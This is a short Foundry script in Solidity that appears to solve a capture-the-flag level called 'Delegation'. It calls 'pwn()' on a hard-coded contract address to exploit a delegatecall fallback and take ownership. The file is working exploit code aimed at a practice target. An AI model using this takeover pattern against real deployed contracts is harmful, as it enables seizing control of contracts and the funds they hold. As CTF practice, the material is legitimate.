// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import {Delegation} from "../src/Level7Delegation.sol";
import {Script, console} from "forge-std/Script.sol";

contract Level7DelegationSolv is Script {
    address _delegation = 0x2735efc0a811BbfD78f38EA7DD5959b8C43CDAae;
    Delegation delegation = new Delegation(_delegation);

    function run() external {
        vm.startBroadcast();

        (bool success,) = address(_delegation).call(abi.encodeWithSignature("pwn()"));
        require(success, "Attack failed");
        vm.stopBroadcast();
    }
}
